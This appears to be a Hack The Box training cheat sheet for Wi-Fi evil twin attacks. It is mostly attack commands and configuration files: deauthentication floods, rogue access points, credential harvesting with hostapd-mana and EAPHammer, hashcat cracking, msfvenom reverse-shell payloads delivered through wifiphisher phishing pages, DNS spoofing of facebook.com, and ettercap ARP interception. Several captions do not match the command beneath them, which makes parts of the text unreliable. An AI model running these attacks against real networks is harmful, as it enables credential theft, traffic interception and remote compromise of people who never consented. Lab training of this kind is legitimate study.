title: Wi-Fi Evil Twin Attacks
html:
Wi-Fi Evil Twin Attacks

Enumeration

Set the wlan0 interface to monitor mode

sudo airmon-ng start wlan0

Scan for available networks

sudo airodump-ng wlan0mon

Scan for available networks on channel 1, and save network traffic to a file

sudo airodump-ng wlan0mon -w HTB -c 1

Deauthenticating an access point.

sudo aireplay-ng --deauth 5 -a D4:C1:8B:79:AD:45 wlan0mon

Deauthenticating a specific client from an access point.

sudo aireplay-ng --deauth 5 -a D4:C1:8B:79:AD:45 -c 02:00:00:00:01:00 wlan0mon

Deauthentication

Deauthenticating an access point.

sudo aireplay-ng --deauth 5 -a D4:C1:8B:79:AD:45 wlan0mon

Deauthenticating a specific client from an access point.

sudo aireplay-ng --deauth 5 -a D4:C1:8B:79:AD:45 -c 02:00:00:00:01:00 wlan0mon

Routing commands & configuration

DNS Config (dns.conf)

interface=wlan1
dhcp-range=<target-ip>,<target-ip>,255.255.255.0,10h
dhcp-option=3,<target-ip>
dhcp-option=6,<target-ip>
server=8.8.4.4
server=8.8.8.8
listen-address=127.0.0.1
address=/#/<target-ip>
log-dhcp
log-queries

Launch the DNS/DHCP service with our conguration.

sudo dnsmasq -C dns.conf -d

Configure valid IP address for the network interface to be used to host the rogue AP.

sudo ifconfig wlan1 <target-ip>/24

Enable IP forwarding

sudo sh -c 'echo 1 > /proc/sys/net/ipv4/ip\_forward'

Shut down the wlan1 interface.

sudo ifconfig wlan1 down

Assign a spoofed MAC address to the wlan1 interface.

sudo macchanger -m D4:C1:8B:79:AD:44 wlan1

Start the wlan1 interface.

sudo ifconfig wlan1 up

Redirect traffic from the victim to our attack host

sudo dnsspoof -i wlan1

Enable NAT masquerading

sudo iptables --append POSTROUTING --table nat --out-interface eth0 -j MASQUERADE

Accept traffic from the wlan0 interface.

sudo iptables --append FORWARD --in-interface wlan0 -j ACCEPT

Password Cracking

Converts a captured WPA handshake into a pcap.

hcxhash2cap --hccapx=handshake.hccapx -c handshake.pcap

Converts the pcap to a Hashcat compatible hash format.

hcxpcapngtool handshake.pcap -o hash.22000

Cracking WPA/WPA2 hash.

hashcat -a 0 -m 22000 hash.22000 /opt/wordlist.txt --force

Cracking NetNTLM hash.

hashcat -m 5500 -a 0 Administrator::::54as5<SNIP>5s5:as65a4sd564d1a2s wordlist.dict

Rogue Access Point Usage

Launching a wireless access point with hostapd (Host Access Point Daemon).

sudo hostapd hostapd.conf

Launching hostapd-mana, a modified version of hostapd optimized for rogue AP attacks and credential harvesting.

sudo hostapd-mana hostapd.conf

sudo hostapd-wp2 hostapd.conf

Launching hostapd-wpe, a modified version of hostapd designed to target WPA-2 Enterprise networks and EAP-based authentication methods.

Hostapd configurations (hostapd.conf)

Open Network

interface=wlan1
hw_mode=g
ssid=HTB-Corp
channel=1
driver=nl80211

Mana Loud

interface=wlan1
driver=nl80211
hw_mode=g
channel=1
ssid=Anything
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP CCMP
wpa_passphrase=Anything

# Mana Configuration
enable_mana=1
mana_loud=1

WPA2 Handshake Capture

interface=wlan1
driver=nl80211
hw_mode=g
channel=1
ssid=HackMe
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP CCMP
wpa_passphrase=anything
mana_wpaout=handshake.hccapx

Enterprise Rogue AP

# 802.11 Options
interface=wlan1
ssid=HTB-Wireless
channel=1
auth_algs=3
wpa_key_mgmt=WPA-EAP
wpa_pairwise=TKIP CCMP
wpa=3
hw_mode=g
ieee8021x=1

# EAP Configuration
eap_server=1
eap_user_file=hostapd.eap_user

# Certificates

ca_cert=ca.pem
server_cert=server.pem
private_key=server-key.pem
private_key_passwd=whatever
dh_file=dh.pem

# Hostapd-mana Edition
# Remove comments and reload to activate
#enable_mana=1
#mana_loud=1
#mana_credout=credentials.creds
#mana_eapsuccess=1
#mana_wpe=1

EAP Method Negotiation \[hostapd.eap\_user\]

* PEAP,TTLS,TLS,MD5,GTC,FAST
"t" TTLS-PAP,GTC,TTLS-CHAP,TTLS-MSCHAP,TTLS-MSCHAPV2,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAP "challenge1234" [2]

Automated Evil Twin Attacks

Wifiphisher

Ensures that WiFi interfaces are restored and ready, before initiating an attack.

sudo systemctl restart NetworkManager

Launch the OAuth phishing attack.

wifiphisher --essid "FREE WI-FI" -p oauth-login -kB -kN

Launch the firmware upgrade phishing attack.

wifiphisher -aI wlan0 -eI wlan1 -p firmware-upgrade --handshake-capture HTB-01.cap -kN

Generates a malicious ELF file.

msfvenom -p linux/x64/shell\_reverse\_tcp LHOST=10.0.0.1 LPORT=4444 -f elf > shell.elf

Generates a malicious Portable Executable.

msfvenom -p windows/x64/shell\_reverse\_tcp LHOST=10.0.0.1 LPORT=4444 -f exe > shell.exe

Launch the plugin update phishing attack.

wifiphisher -aI wlan0 -eI wlan1 -p plugin\_update --payload-path /home/wifi/shell.elf -kN

Starts a netcat listener.

nc -nvlp 4444

EAPHammer

Creates self-signed certificates for the rogue AP.

sudo /opt/eaphammer/eaphammer --cert-wizard

Launches the ESSID-stripped rogue AP

sudo /opt/eaphammer/eaphammer -i wlan1 --auth wpa-eap --essid HTB-Wireless --creds --negotiate balanced --essid-stripping '\\x20'

ESSID Stripping

Add a space, like a white space after ESSID

\x20

For NULL after ESSID, it'll omit all characters after it

\x00

Add tab after ESSID

\t

Add new line after ESSID

\r

For a enter, similar to '\\r' after ESSID

\n

MITM Attacks

DNS Spoofing

Launch wifipumpkin3.

sudo wifipumpkin3

Set the wireless interface for the AP.

set interface wlan1

Set the SSID for the AP.

set ssid HTB-Corp

Disable the proxy.

set proxy noproxy

Exclude the DNS server.

ignore pydns\_server

View current settings configured for our rogue AP.

ap

Display available modules in wifipumpkin3.

show

Select the dns_spoof module.

use spoof.dns\_spoof

Set the domain(s) to be spoofed.

set domains academy.hackthebox.com, <facebook.com>

Set the IP address that DNS requests will be redirected to.

set redirectTo 10.0.0.1

Start the DNS spoof attack

start

Navigate out of the dns\_spoof configuration and back to the wifipumpkin3 console

back

Start the rogue AP.

start

Start the rogue AP.

start

Enable the first virtual host.

sudo a2ensite intranet1.conf

Enable the second virtual host.

sudo a2ensite intranet2.conf

Restart Apache web server.

sudo systemctl restart apache2

If necessary, perform deauthentication attack to force victims to connect to the rogue AP.

sudo aireplay-ng --deauth 5 -a 9C:9A:03:39:BD:7A wlan0mon

Virtual Host Configuration

/etc/apache2/sites-available/intranet1.conf

<VirtualHost *:80>
    ServerAdmin admin@hackthebox.com
    ServerName academy.hackthebox.com
    ServerAlias www.academy.hackthebox.com
    DocumentRoot /var/www/html
    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>

/etc/apache2/sites-available/intranet2.conf

<VirtualHost *:80>
    ServerAdmin admin@facebook.com
    ServerName facebook.com
    ServerAlias www.facebook.com
    DocumentRoot /var/www/html/facebook
    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>

View the basic help menu

sudo a2ensite intranet1.conf

View the advanced help menu

sudo a2ensite intranet2.conf

Run SQLMap without asking for user input

sudo systemctl restart apache2

SSL Interception

Routing Configuration

dns.conf

interface=wlan1
dhcp-range=<target-ip>,<target-ip>,255.255.255.0,10h
dhcp-option=3,<target-ip>
dhcp-option=6,<target-ip>
server=8.8.4.4
server=8.8.8.8
listen-address=127.0.0.1
address=/#/<target-ip>
log-dhcp
log-queries

hostapd.conf

interface=wlan1
hw_mode=g
ssid=HTB-Corp
channel=1
driver=nl80211

Configure the IP address for the interface that will host the fake access point.

sudo ifconfig wlan1 <target-ip>/24

Start the DNS server.

sudo dnsmasq -c dns.conf -d

Enable IP forwarding.

sudo sh -c 'echo 1 > /proc/sys/net/ipv4/ip\_forward'

Start the access point.

sudo hostapd hostapd.conf

Initiate the SSL intercept attack

ettercap -T -q -M ARP -i wlan1
